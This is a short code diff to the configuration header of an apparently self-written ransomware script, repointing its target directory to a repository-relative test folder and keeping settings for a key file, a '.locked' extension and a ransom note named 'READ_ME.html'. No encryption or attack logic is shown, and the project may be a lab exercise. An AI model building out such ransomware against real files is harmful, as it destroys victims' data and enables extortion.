@@ -1,8 +1,10 @@
 import os
+from pathlib import Path
 from cryptography.fernet import Fernet
 
 # ── CONFIG ────────────────────────────────────────────
-TARGET_DIR       = r"/home/hunter/Documents/tools/RANSOMWARE-FUMES/Test Folder/Test/"
+REPO_ROOT        = Path(__file__).resolve().parents[3]
+TARGET_DIR       = REPO_ROOT / "Test Folder"
 KEY_FILE         = "key.txt"
 LOCKED_EXTENSION = ".locked"
 NOTE_FILENAME    = "READ_ME.html"   # optional to delete afterward
